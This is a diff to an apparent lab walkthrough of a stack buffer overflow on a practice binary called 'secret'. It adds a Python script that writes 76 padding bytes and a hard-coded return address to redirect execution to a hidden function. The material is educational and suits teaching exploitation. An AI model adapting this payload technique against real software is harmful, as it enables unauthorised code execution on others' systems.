@@ -127,3 +127,17 @@ This command runs the `secret` binary while injecting the payload directly, aimi
 ![bof8](https://github.com/user-attachments/assets/8cb7ccb8-7d12-4270-b767-9bd6c8cb6e26)
 
 As a result, the function was executed, printing the message "You have exploited the buffer overflow!" before the program crashed with a segmentation fault.
+
+You can also save the payload in a Python script and execute it when running the `secret` binary, simplifying the injection process.
+
+```python3
+import sys
+
+secret_func_address = b'\x9d\x61\x55\x56'
+payload = b'A' * 76 + secret_func_address
+
+sys.stdout.buffer.write(payload)
+```
+
+![bof9](https://github.com/user-attachments/assets/52f80186-b3d2-4e3d-a361-28f8dbb49a01)
+
